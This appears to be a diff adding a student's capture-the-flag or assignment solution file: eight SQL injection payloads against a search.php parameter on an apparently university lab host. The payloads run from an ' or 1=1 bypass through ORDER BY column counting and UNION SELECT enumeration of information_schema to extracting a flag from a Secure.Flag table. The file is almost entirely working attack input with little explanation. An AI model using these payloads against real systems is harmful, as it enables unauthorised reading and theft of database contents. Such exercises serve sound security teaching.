@@ -1,0 +1,10 @@
+// Please try the scripts step by step following my report in the "search" box
+
+1. ' or 1=1 #
+2. http://assignment-artemis.unimelb.life/search.php?search=ball' order by 4 --+
+3. http://assignment-artemis.unimelb.life/search.php?search=ball' order by 5 --+ 
+4. http://assignment-artemis.unimelb.life/search.php?search=ball'  union select 1,2,3,4 --+
+5. http://assignment-artemis.unimelb.life/search.php?search=ball' union select 1,2,3, database() --+
+6. http://assignment-artemis.unimelb.life/search.php?search=ball' union select 1,2,3,table_name from information_schema.tables where table_schema='Secure' --+
+7. http://assignment-artemis.unimelb.life/search.php?search=ball' union select 1,2,3, column_name from information_schema.columns where table_name='Flag' --+
+8. http://assignment-artemis.unimelb.life/search.php?search=ball' union select 1,2,3, string from Secure.Flag --+
